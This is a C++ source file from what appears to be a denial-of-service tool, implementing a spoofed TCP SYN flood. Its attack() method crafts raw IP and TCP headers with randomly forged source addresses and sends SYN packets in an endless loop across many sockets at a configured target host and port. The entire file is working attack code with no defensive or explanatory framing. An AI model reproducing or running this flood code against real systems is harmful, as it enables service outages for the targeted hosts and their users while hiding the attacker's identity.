#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <csignal>

#include "Randomizer.hpp"
#include "Spoofed_TCP_Flood.hpp"

void Spoofed_TCP_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    std::string message{};
    char buf[8192], *pseudogram;
    struct pseudo_header psh{};
    auto *ip = (struct iphdr *) buf;
    auto *tcp = (struct tcphdr *) (buf + sizeof (struct ip));
    struct hostent *hp;
    struct sockaddr_in dst{};
    auto s_port = Randomizer::randomInt(0, 65535);
    signal(SIGPIPE, &Spoofed_TCP_Flood::broke);
    while (true){
        for(int x = 0; x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if(!sockets[x]){
                sockets[x] = make_socket(IPPROTO_TCP);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
                    logger->Log("Can't resolve the host", Logger::Error);
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
            }
            if((ip->saddr = inet_addr(Randomizer::randomIP())) == -1){
                continue;
            }

            // IP Struct
            ip->ihl = 5;
            ip->version = 4;
            ip->tos = 16;
            ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(buf);
            ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
            ip->frag_off = htons(0x0);
            ip->ttl = 255;
            ip->protocol = IPPROTO_TCP;
            ip->check = 0;

            dst.sin_addr.s_addr = ip->daddr;
            dst.sin_family = AF_UNSPEC;

            ip->check = csum ((unsigned short *) buf, ip->tot_len);

            // TCP Struct
            tcp->source = htons(static_cast<uint16_t>(s_port));
            tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
            tcp->seq = 0;
            tcp->ack_seq = 0;
            tcp->doff = 5;  //tcp header size
            tcp->fin=0;
            tcp->syn=1;
            tcp->rst=0;
            tcp->psh=0;
            tcp->ack=0;
            tcp->urg=0;
            tcp->window = htons (5840);
            tcp->check = 0;
            tcp->urg_ptr = 0;

            psh.source_address = inet_addr(conf->website.c_str());
            psh.dest_address = dst.sin_addr.s_addr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.length = htons(sizeof(struct tcphdr) + strlen(buf));

            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(buf);
            pseudogram = static_cast<char *>(malloc(static_cast<size_t>(psize)));

            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr) + strlen(buf));

            tcp->check = csum( (unsigned short*) pseudogram , psize);


            if((r = static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1){
                close(sockets[x]);
                sockets[x] = make_socket(IPPROTO_TCP);
            }else{
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
    }
}

Spoofed_TCP_Flood::Spoofed_TCP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {

}
